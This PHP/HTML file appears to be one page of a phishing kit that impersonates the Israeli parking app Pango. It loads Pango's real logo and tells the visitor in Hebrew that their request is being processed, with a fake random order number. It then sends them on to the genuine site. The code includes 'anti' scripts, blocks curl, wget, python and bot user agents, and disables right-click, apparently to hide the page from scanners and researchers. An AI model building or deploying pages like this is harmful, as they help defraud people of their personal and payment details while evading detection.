<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');

// Anti-Bot Protection
function blockSuspiciousUserAgent()
{
    $botAgents = [
        'curl',
        'wget',
        'bot',
        'crawler',
        'spider',
        'http',
        'python',
        'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs()
{
    $blockedIPs = [
        '192.168.1.1', // Replace with actual IPs to block
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}

// Call protection functions
blockSuspiciousUserAgent();
blockSuspiciousIPs();
?>
<html lang="he">

<head>
    <script language=JavaScript>
    var message = "";
    ///////////////////////////////////
    function clickIE() {
        if (document.all) {
            (message);
            return false;
        }
    }

    function clickNS(e) {
        if (document.layers || (document.getElementById && !document.all)) {
            if (e.which == 2 || e.which == 3) {
                (message);
                return false;
            }
        }
    }
    if (document.layers) {
        document.captureEvents(Event.MOUSEDOWN);
        document.onmousedown = clickNS;
    } else {
        document.onmouseup = clickNS;
        document.oncontextmenu = clickIE;
    }

    document.oncontextmenu = new Function("return false")
    // --> 
    </script>




    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>מעבד נתונים</title>
    <style>
    body {
        font-family: Arial, sans-serif;
        direction: rtl;
        text-align: center;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f9f9f9;
    }

    .header {
        position: absolute;
        top: 0;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 10px 0;
        background-color: white;
        border-bottom: 1px solid #ddd;
    }

    .header img {
        height: 40px;
    }

    .content {
        background-color: white;
        padding: 20px;
        border-radius: 15px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        max-width: 400px;
        width: 90%;
        text-align: center;
    }

    .content h1 {
        font-size: 20px;
        color: #007bff;
        margin-bottom: 15px;
    }

    .content p {
        font-size: 16px;
        color: #333;
        margin: 10px 0;
    }

    .order-number {
        font-size: 18px;
        font-weight: bold;
        color: #007bff;
    }

    .button-container {
        margin-top: 20px;
    }

    .button-container button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 25px;
        cursor: pointer;
        font-size: 16px;
    }

    .button-container button:hover {
        background-color: #0056b3;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border: 4px solid #ccc;
        border-top: 4px solid #007bff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }

    @keyframes spin {
        from {
            transform: rotate(0deg);
        }

        to {
            transform: rotate(360deg);
        }
    }
    </style>
    <script>
    function generateOrderNumber() {
        return Math.floor(1000 + Math.random() * 9000);
    }


    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('order-number').textContent = generateOrderNumber();
    });


    function redirectToWebsite() {
        const spinner = document.querySelector('.spinner');
        spinner.style.display = 'block';

        setTimeout(() => {
            window.location.href = "https://www.pango.co.il/";
        }, 10000);
    }
    </script>
</head>

<body>
    <!-- Header -->
    <div class="header">
        <img src="https://www.pango.co.il/tpl/website/img/logo.png" alt="Pango Logo">
    </div>

    <!-- Content -->
    <div class="content">
        <h1>מעבד נתונים</h1>
        <p>מעבדת את הבקשה שלך, זה עלול לקחת בין <strong>24 ל-72 שעות</strong>.</p>
        <p>נחזור אליך בהודעת SMS או שיחה טלפונית למספר שסיפקת קודם.</p>
        <p class="order-number">מספר בקשה: <span id="order-number"></span></p>
        <div class="button-container">
            <button onclick="redirectToWebsite()">יציאה</button>
        </div>
        <div class="spinner" style="display: none;"></div>
    </div>
    </div>

    <div class="footer">
        <p style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">הורידו את האפליקציה</p>
        <div class="download-buttons" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
            <a href="#"
                style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Google
                Play</a>
            <a href="#"
                style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Apple
                Store</a>
        </div>
        <ul style="list-style: none; padding: 0; margin: 0; text-align: center;">
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">הסדרים משפטיים</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אפשרות הסרת
                    שירותים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">פרסומים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אבטחת מידע</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">תנאי שימוש פנגו</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">מדיניות פרטיות</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">עירוי פנגו</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אודות</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">מפת אתר</a></li>
        </ul>
    </div>
</body>

</html>
</body>

</html>